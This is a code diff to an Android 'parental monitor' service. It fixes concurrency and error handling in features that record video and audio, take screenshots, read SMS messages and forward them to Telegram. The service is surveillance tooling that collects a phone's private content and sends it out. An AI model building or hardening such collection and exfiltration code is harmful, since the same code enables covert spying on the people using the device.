@@ -168,6 +168,7 @@ class MonitoringService : Service() {
     @Volatile
     private var patrolJob: Job? = null
     private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
+    private val initialSyncGen = java.util.concurrent.atomic.AtomicInteger(0)
     private val initialSyncLock = Any()
     @Volatile
     private var initialSyncRetryAt = 0L
@@ -404,15 +405,15 @@ class MonitoringService : Service() {
                 initialSyncRunning.set(false)
                 if (preferencesManager.initialSyncDone) return
                 if (!initialSyncRunning.compareAndSet(false, true)) return
+                val syncGen = initialSyncGen.incrementAndGet()
                 initialSyncJob = serviceScope.launch {
-                    val self = coroutineContext[Job]
                     try {
                         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Starting initial data collection...")
                         sendInitialData()
                         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Initial data collection completed")
                     } catch (_: Exception) {
                     } finally {
-                        if (initialSyncJob === self) initialSyncRunning.set(false)
+                        if (initialSyncGen.get() == syncGen) initialSyncRunning.set(false)
                     }
                 }
             }
@@ -2110,7 +2111,11 @@ class MonitoringService : Service() {
                     sendToTelegram("\uD83C\uDFA5 Recording video $seconds s\u2026")
                     try { recordJob?.cancel() } catch (_: Exception) { }
                     recordJob = serviceScope.launch {
-                        recordAndSendVideo(seconds)
+                        try {
+                            recordAndSendVideo(seconds)
+                        } finally {
+                            recordBusy.set(false)
+                        }
                     }
                 }
             }
@@ -3019,8 +3024,9 @@ class MonitoringService : Service() {
                         appendLine()
                         part.forEach { sms ->
                             appendLine("📞 Nomor: ${Html.escape(sms.address)}")
-                            val body = Html.escape(sms.body).let { it.take(safeCut(it, 200)) }
-                            appendLine("📝 Isi: $body${if (sms.body.length > 200) "..." else ""}")
+                            val full = Html.escape(sms.body)
+                            val body = full.take(safeCut(full, 200))
+                            appendLine("📝 Isi: $body${if (full.length > body.length) "..." else ""}")
                             appendLine("🔄 Jenis: ${sms.getTypeString()}")
                             appendLine("⏰ Waktu: ${formatDate(sms.date)}")
                             appendLine("━━━━━━━━━━━━━━━━")
@@ -5538,19 +5544,19 @@ class MonitoringService : Service() {
                 } catch (e: SecurityException) {
                     try { releaseShotSurface() } catch (_: Exception) { }
                     try { wd.cancel() } catch (_: Exception) { }
-                    shotBusy.set(false)
+                    clearShotBusy(shotSeq)
                     android.util.Log.w("MonitoringService", "Tangkap layar ditolak sistem: " + redactToken(e.message))
                     sendToTelegram("⚠️ Tangkap layar ditolak sistem. " + screenshotFailureHint())
                     return@launch
                 }
                 if (shotAttempt.get() != shotSeq) {
                     try { shotFile?.delete() } catch (_: Exception) { }
-                    shotBusy.set(false)
+                    clearShotBusy(shotSeq)
                     return@launch
                 }
                 try { wd.cancel() } catch (_: Exception) { }
                 if (shotFile == null) {
-                    shotBusy.set(false)
+                    clearShotBusy(shotSeq)
                     sendToTelegram("⚠️ Tangkap layar gagal. " + screenshotFailureHint())
                     return@launch
                 }
@@ -5570,13 +5576,13 @@ class MonitoringService : Service() {
                 } finally {
                     clearMediaActive(shotFile)
                 }
-                shotBusy.set(false)
+                clearShotBusy(shotSeq)
             } catch (e: kotlinx.coroutines.CancellationException) {
-                shotBusy.set(false)
+                clearShotBusy(shotSeq)
                 try { wd.cancel() } catch (_: Exception) { }
                 throw e
             } catch (e: Exception) {
-                shotBusy.set(false)
+                clearShotBusy(shotSeq)
                 try { wd.cancel() } catch (_: Exception) { }
                 android.util.Log.e("MonitoringService", "✗ Error in captureAndSendScreenshot: ${redactToken(e.message)}")
                 serviceScope.launch {
@@ -5584,6 +5590,10 @@ class MonitoringService : Service() {
                 }
             }
         }
+    }
+
+    private fun clearShotBusy(seq: Int) {
+        if (shotAttempt.get() == seq) shotBusy.compareAndSet(true, false)
     }
 
     private fun releaseShotSurface() {
@@ -6524,8 +6534,19 @@ class MonitoringService : Service() {
             audioOutcome = sendAudioFile(audioFile)
             when (audioOutcome) {
                 MediaSendOutcome.SENT -> {
-                    sendToTelegram("\uD83C\uDF99\uFE0F Rekaman terkirim (${seconds} dtk).")
-                    flushPendingAudio()
+                    try {
+                        sendToTelegram("\uD83C\uDF99\uFE0F Rekaman terkirim (${seconds} dtk).")
+                    } catch (e: kotlinx.coroutines.CancellationException) {
+                        throw e
+                    } catch (_: Exception) {
+                    }
+                    audioOutcome = null
+                    try {
+                        flushPendingAudio()
+                    } catch (e: kotlinx.coroutines.CancellationException) {
+                        throw e
+                    } catch (_: Exception) {
+                    }
                 }
                 MediaSendOutcome.DROPPED -> {
                     keepForRetry = false
